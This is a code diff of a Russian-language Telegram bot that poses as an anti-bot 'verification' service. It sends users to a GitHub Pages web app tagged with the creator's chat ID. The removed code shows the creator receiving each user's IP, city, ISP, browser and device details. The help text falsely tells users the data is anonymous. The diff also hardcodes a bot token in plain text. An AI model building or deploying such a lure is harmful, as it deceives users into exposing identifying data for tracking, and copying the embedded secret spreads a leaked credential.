@@ -1,10 +1,10 @@
+#!/usr/bin/env python3
 """
 Telegram Verification Bot
 Основной модуль бота для верификации пользователей
 """
 
 import logging
-import asyncio
 import secrets
 from datetime import datetime
 from typing import Dict, Optional
@@ -24,69 +24,12 @@ from telegram.ext import (
     filters
 )
 
-# Импортируем конфигурацию
-from config import (
-    BOT_TOKEN,
-    CREATOR_CHAT_ID,
-    WEBSITE_BASE_URL,
-    DB_CONFIG,
-    DEBUG,
-    LOG_LEVEL,
-    LOG_FILE,
-    WELCOME_MESSAGE,
-    SUCCESS_MESSAGE,
-    ERROR_MESSAGE,
-    TOKEN_EXPIRY,
-    USE_WEBHOOK,
-    WEBHOOK_PATH,
-    WEBHOOK_FULL_URL,
-    print_config_summary,
-    validate_config
-)
-
-# Импортируем модуль базы данных
-try:
-    from database_mysql import init_database, save_verification_token, save_collected_data
-    DB_TYPE = "MySQL"
-except ImportError:
-    try:
-        from database import init_database, save_verification_token, save_collected_data
-        DB_TYPE = "SQLite"
-    except ImportError:
-        print("❌ Не найден модуль базы данных")
-        DB_TYPE = None
-
 # Настройка логирования
-def setup_logging():
-    """Настройка системы логирования"""
-    log_formatter = logging.Formatter(
-        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-        datefmt='%Y-%m-%d %H:%M:%S'
-    )
-    
-    # Файловый обработчик
-    file_handler = logging.FileHandler(LOG_FILE)
-    file_handler.setFormatter(log_formatter)
-    file_handler.setLevel(getattr(logging, LOG_LEVEL))
-    
-    # Консольный обработчик
-    console_handler = logging.StreamHandler()
-    console_handler.setFormatter(log_formatter)
-    console_handler.setLevel(logging.INFO if DEBUG else logging.WARNING)
-    
-    # Настройка корневого логгера
-    root_logger = logging.getLogger()
-    root_logger.setLevel(logging.DEBUG if DEBUG else logging.INFO)
-    root_logger.addHandler(file_handler)
-    root_logger.addHandler(console_handler)
-    
-    # Отключаем логи от зависимостей
-    logging.getLogger('httpx').setLevel(logging.WARNING)
-    logging.getLogger('httpcore').setLevel(logging.WARNING)
-    
-    return root_logger
-
-logger = setup_logging()
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 class VerificationBot:
     """Основной класс бота верификации"""
@@ -94,7 +37,18 @@ class VerificationBot:
     def __init__(self):
         self.app = None
         self.active_tokens = {}  # Кэш активных токенов
-        logger.info(f"Инициализация Verification Bot (БД: {DB_TYPE})")
+        self.GITHUB_PAGES_URL = "https://arkadiy1803.github.io/verification-web"
+        self.BOT_TOKEN = "7725874473:AAEEZj4LtuhjcL0lqN9nATOcihJr2uqyhi0"
+        self.CREATOR_CHAT_ID = "990561525"
+        
+        logger.info(f"Инициализация Verification Bot")
+        print("\n" + "="*60)
+        print("🤖 КОНФИГУРАЦИЯ БОТА:")
+        print("="*60)
+        print(f"✅ Токен: {self.BOT_TOKEN[:15]}...")
+        print(f"👤 Создатель: {self.CREATOR_CHAT_ID}")
+        print(f"🌐 Ссылка на сайт: {self.GITHUB_PAGES_URL}")
+        print("="*60 + "\n")
         
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Обработчик команды /start"""
@@ -104,8 +58,8 @@ class VerificationBot:
         # Генерация уникального токена
         token = secrets.token_urlsafe(32)
         
-        # URL для верификации
-        verification_url = f"{WEBSITE_BASE_URL}/verify?token={token}&user_id={user.id}"
+        # URL для верификации - ИСПРАВЛЕНА ССЫЛКА
+        verification_url = f"{self.GITHUB_PAGES_URL}/?token={token}&user_id={user.id}&chat_id={self.CREATOR_CHAT_ID}"
         
         # Сохраняем информацию в кэш
         self.active_tokens[token] = {
@@ -117,16 +71,6 @@ class VerificationBot:
             'status': 'pending'
         }
         
-        # Сохраняем в базу данных
-        if DB_TYPE:
-            save_verification_token(
-                telegram_id=user.id,
-                username=user.username,
-                first_name=user.first_name,
-                last_name=user.last_name,
-                token=token
-            )
-        
         # Создаем кнопку для верификации
         keyboard = [
             [
@@ -134,192 +78,286 @@ class VerificationBot:
                     "🔐 Пройти верификацию",
                     web_app=WebAppInfo(url=verification_url)
                 )
-            ],
+            ]
+        ]
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # Приветственное сообщение
+        welcome_text = f"""
+👋 Привет, {user.first_name}!
+
+🤖 **Verification Bot** — система защиты от ботов.
+
+🔒 **Процесс верификации:**
+• Проверка устройства и браузера
+• Анализ сетевых параметров
+• Защита от автоматических систем
+
+📋 **Команды:**
+/start - Запуск бота
+/verify - Пройти верификацию
+/status - Проверить статус
+/help - Помощь
+
+⚡ **Нажмите кнопку ниже для начала:**
+        """
+        
+        await update.message.reply_text(
+            welcome_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        
+        logger.info(f"Создан токен верификации для пользователя {user.id}: {token[:10]}...")
+    
+    async def verify_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Команда для начала верификации"""
+        user = update.effective_user
+        logger.info(f"Пользователь {user.id} запросил верификацию")
+        
+        # Генерация уникального токена
+        token = secrets.token_urlsafe(32)
+        
+        # URL для верификации - ИСПРАВЛЕНА ССЫЛКА
+        verification_url = f"{self.GITHUB_PAGES_URL}/?token={token}&user_id={user.id}&chat_id={self.CREATOR_CHAT_ID}"
+        
+        # Сохраняем информацию в кэш
+        self.active_tokens[token] = {
+            'telegram_id': user.id,
+            'username': user.username,
+            'first_name': user.first_name,
+            'last_name': user.last_name,
+            'created_at': datetime.now(),
+            'status': 'pending'
+        }
+        
+        # Создаем кнопку для верификации
+        keyboard = [
             [
                 InlineKeyboardButton(
-                    "🌐 Открыть в браузере",
-                    url=verification_url
+                    "🔐 Начать верификацию",
+                    web_app=WebAppInfo(url=verification_url)
                 )
             ]
         ]
         
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Отправляем приветственное сообщение
         await update.message.reply_text(
-            WELCOME_MESSAGE,
+            "🔒 **Начало процесса верификации**\n\n"
+            f"👤 **Пользователь:** {user.first_name}\n"
+            f"🆔 **ID:** `{user.id}`\n"
+            f"🔑 **Токен:** `{token[:10]}...`\n\n"
+            "Нажмите кнопку ниже для начала:",
             reply_markup=reply_markup,
-            parse_mode='HTML'
+            parse_mode='Markdown'
         )
-        
-        logger.info(f"Создан токен верификации для пользователя {user.id}: {token[:10]}...")
     
     async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Проверка статуса верификации"""
         user = update.effective_user
         
-        # Здесь должна быть проверка статуса из БД
-        # Временная заглушка
+        # Ищем активные токены пользователя
+        user_tokens = {k: v for k, v in self.active_tokens.items() if v['telegram_id'] == user.id}
+        
+        if user_tokens:
+            token_info = next(iter(user_tokens.values()))
+            status_text = f"""
+📊 **Статус верификации:**
+
+👤 **Пользователь:** {user.first_name} (@{user.username or 'без username'})
+🆔 **ID:** `{user.id}`
+📅 **Начато:** {token_info['created_at'].strftime('%H:%M:%S')}
+🔐 **Статус:** {token_info['status'].upper()}
+
+💡 **Инструкция:**
+Используйте команду /verify для начала новой верификации.
+            """
+        else:
+            status_text = """
+📊 **Статус верификации**
+
+❌ **Активных верификаций не найдено.**
+
+Для начала верификации используйте команду /verify
+            """
+        
+        keyboard = [[
+            InlineKeyboardButton("🔄 Пройти верификацию", callback_data="start_verify")
+        ]]
+        
         await update.message.reply_text(
-            "📊 Статус верификации: Не пройдена\n"
-            "Используйте /start для начала верификации.",
-            parse_mode='HTML'
+            status_text,
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    
+    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Админ панель"""
+        user = update.effective_user
+        
+        # Проверка прав доступа
+        if str(user.id) != self.CREATOR_CHAT_ID:
+            await update.message.reply_text("⛔ У вас нет доступа к админ панели.")
+            return
+        
+        stats_text = f"""
+⚙️ **АДМИН ПАНЕЛЬ**
+
+📊 **Статистика:**
+• Всего активных токенов: {len(self.active_tokens)}
+• Уникальных пользователей: {len(set(v['telegram_id'] for v in self.active_tokens.values()))}
+
+🌐 **Ссылки:**
+• GitHub Pages: {self.GITHUB_PAGES_URL}
+• Сайт верификации: {self.GITHUB_PAGES_URL}/?token=TEST&user_id=ID
+
+👥 **Последние активности:**
+{self.get_recent_activities()}
+        """
+        
+        await update.message.reply_text(
+            stats_text,
+            parse_mode='Markdown'
         )
     
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Команда помощи"""
         help_text = """
-🤖 *Команды бота:*
+📚 **Помощь по использованию бота:**
 
-/start - Начать верификацию
-/status - Проверить статус верификации
-/help - Показать это сообщение
+🔐 **Процесс верификации:**
+1. Нажмите /verify или кнопку "Пройти верификацию"
+2. Откроется окно верификации на сайте
+3. Дождитесь завершения автоматической проверки
+4. Вернитесь в бота
 
-🔒 *Процесс верификации:*
-1. Нажмите /start
-2. Пройдите проверку на сайте
-3. Получите доступ к функциям бота
+⚠️ **Важная информация:**
+• Верификация требуется для доступа к некоторым функциям
+• Процесс занимает 10-30 секунд
+• Не закрывайте окно верификации
+• Все данные собираются анонимно для безопасности
 
-⚠️ *Безопасность:* 
-Все данные защищены и используются только для проверки.
+🛡️ **Безопасность:**
+• Мы не собираем пароли или платежные данные
+• Данные используются только для защиты от ботов
+
+📋 **Команды:**
+/start - Запуск бота
+/verify - Пройти верификацию
+/status - Проверить статус
+/admin - Админ панель (только для создателя)
+/help - Помощь
         """
-        await update.message.reply_text(help_text, parse_mode='Markdown')
+        
+        await update.message.reply_text(
+            help_text,
+            parse_mode='Markdown'
+        )
     
-    async def receive_data_webhook(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Обработка данных с веб-сервера"""
-        try:
-            # Получаем данные из webhook
-            data = update.message.text if update.message else None
+    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка нажатий на кнопки"""
+        query = update.callback_query
+        await query.answer()
+        
+        if query.data == "start_verify":
+            user = query.from_user
+            token = secrets.token_urlsafe(32)
             
-            if data and 'verification_data' in data:
-                # Парсим данные
-                # Здесь должна быть логика обработки данных с веб-сервера
-                logger.info(f"Получены данные верификации: {data[:100]}...")
-                
-                # Отправляем уведомление создателю
-                await self.send_notification_to_creator(data)
-                
-                # Отвечаем пользователю
-                if update.effective_user:
-                    await update.message.reply_text(SUCCESS_MESSAGE)
+            # URL для верификации - ИСПРАВЛЕНА ССЫЛКА
+            verification_url = f"{self.GITHUB_PAGES_URL}/?token={token}&user_id={user.id}&chat_id={self.CREATOR_CHAT_ID}"
             
-        except Exception as e:
-            logger.error(f"Ошибка обработки webhook: {e}")
-            await update.message.reply_text(ERROR_MESSAGE)
+            self.active_tokens[token] = {
+                'telegram_id': user.id,
+                'username': user.username,
+                'first_name': user.first_name,
+                'last_name': user.last_name,
+                'created_at': datetime.now(),
+                'status': 'pending'
+            }
+            
+            keyboard = [[
+                InlineKeyboardButton(
+                    "🔐 Начать верификацию",
+                    web_app=WebAppInfo(url=verification_url)
+                )
+            ]]
+            
+            await query.edit_message_text(
+                "Нажмите кнопку для начала верификации:",
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
     
-    async def send_notification_to_creator(self, data: dict):
-        """Отправка уведомления создателю бота"""
-        try:
-            message = self.format_notification_message(data)
-            
-            # Отправляем сообщение создателю
-            # В реальном коде здесь будет отправка через context.bot.send_message
-            logger.info(f"Уведомление для создателя: {message[:200]}...")
-            
-            # Для теста выводим в лог
-            print(f"\n📨 УВЕДОМЛЕНИЕ СОЗДАТЕЛЮ:")
-            print(message)
-            print("-" * 50)
-            
-        except Exception as e:
-            logger.error(f"Ошибка отправки уведомления: {e}")
+    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка обычных сообщений"""
+        user = update.effective_user
+        text = update.message.text
+        
+        # Ответ на приветствия
+        greetings = ['привет', 'hello', 'hi', 'здравствуй', 'здравствуйте']
+        if text.lower() in greetings:
+            await update.message.reply_text(f"Привет, {user.first_name}! 👋")
     
-    def format_notification_message(self, data: dict) -> str:
-        """Форматирование сообщения с данными"""
-        message = f"""
-🚨 *НОВЫЕ ДАННЫЕ ВЕРИФИКАЦИИ*
-
-👤 *Пользователь:*
-├ ID: {data.get('telegram_id', 'N/A')}
-├ Username: @{data.get('username', 'N/A')}
-├ Имя: {data.get('first_name', 'N/A')}
-└ Фамилия: {data.get('last_name', 'N/A')}
-
-🌐 *Сетевые данные:*
-├ IP: {data.get('ip', 'N/A')}
-├ Страна: {data.get('country', 'N/A')}
-├ Город: {data.get('city', 'N/A')}
-└ Провайдер: {data.get('isp', 'N/A')}
-
-🖥️ *Устройство:*
-├ Браузер: {data.get('browser', 'N/A')}
-├ ОС: {data.get('os', 'N/A')}
-├ Платформа: {data.get('platform', 'N/A')}
-└ Разрешение: {data.get('screen', 'N/A')}
-
-🕐 *Время:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-        """
-        return message
+    def get_recent_activities(self):
+        """Получение последних активностей"""
+        recent = list(self.active_tokens.items())[-5:]  # Последние 5 записей
+        activities = []
+        
+        for token, info in recent:
+            time_ago = datetime.now() - info['created_at']
+            minutes = int(time_ago.total_seconds() / 60)
+            activities.append(f"• {info['first_name']} (@{info['username']}) - {minutes} мин назад")
+        
+        return "\n".join(activities) if activities else "Нет активных верификаций"
     
     def setup_handlers(self):
         """Настройка обработчиков команд"""
         self.app.add_handler(CommandHandler("start", self.start_command))
+        self.app.add_handler(CommandHandler("verify", self.verify_command))
         self.app.add_handler(CommandHandler("status", self.status_command))
+        self.app.add_handler(CommandHandler("admin", self.admin_command))
         self.app.add_handler(CommandHandler("help", self.help_command))
         
-        # Обработчик для данных с веб-сервера
-        self.app.add_handler(MessageHandler(
-            filters.TEXT & ~filters.COMMAND, 
-            self.receive_data_webhook
-        ))
+        # Callback queries
+        self.app.add_handler(CallbackQueryHandler(self.button_callback))
+        
+        # Сообщения
+        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
         
         logger.info("Обработчики команд настроены")
     
-    async def setup_webhook(self):
-        """Настройка webhook для продакшена"""
-        if USE_WEBHOOK:
-            await self.app.bot.set_webhook(
-                url=WEBHOOK_FULL_URL,
-                secret_token=API_SECRET
-            )
-            logger.info(f"Webhook настроен: {WEBHOOK_FULL_URL}")
-        else:
-            logger.info("Используется polling режим")
-    
-    async def run(self):
-        """Запуск бота"""
+    def run_sync(self):
+        """Синхронный запуск бота"""
         try:
-            # Проверка конфигурации
-            if not print_config_summary():
-                logger.error("Ошибки в конфигурации. Бот не запущен.")
-                return
-            
-            # Инициализация базы данных
-            if DB_TYPE:
-                if init_database():
-                    logger.info(f"База данных {DB_TYPE} инициализирована")
-                else:
-                    logger.error(f"Ошибка инициализации БД {DB_TYPE}")
-            
             # Создание приложения
-            self.app = Application.builder().token(BOT_TOKEN).build()
+            self.app = Application.builder().token(self.BOT_TOKEN).build()
             
             # Настройка обработчиков
             self.setup_handlers()
             
-            # Настройка webhook или polling
-            if USE_WEBHOOK:
-                await self.setup_webhook()
-                await self.app.run_webhook(
-                    listen="0.0.0.0",
-                    port=8443,
-                    webhook_url=WEBHOOK_FULL_URL,
-                    secret_token=API_SECRET
-                )
-            else:
-                logger.info("Запуск бота в polling режиме...")
-                await self.app.run_polling(allowed_updates=Update.ALL_TYPES)
-                
+            logger.info("Запуск бота в polling режиме...")
+            
+            # Запуск в polling режиме
+            self.app.run_polling(
+                allowed_updates=Update.ALL_TYPES,
+                drop_pending_updates=True
+            )
+            
         except Exception as e:
             logger.error(f"Критическая ошибка при запуске бота: {e}")
             raise
 
 def main():
-    """Точка входа в приложение"""
-    bot = VerificationBot()
-    
-    # Запуск бота
-    asyncio.run(bot.run())
+    """Основная функция"""
+    try:
+        bot = VerificationBot()
+        bot.run_sync()
+    except KeyboardInterrupt:
+        print("\n\n👋 Бот остановлен пользователем")
+    except Exception as e:
+        print(f"\n❌ Критическая ошибка: {e}")
+        raise
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
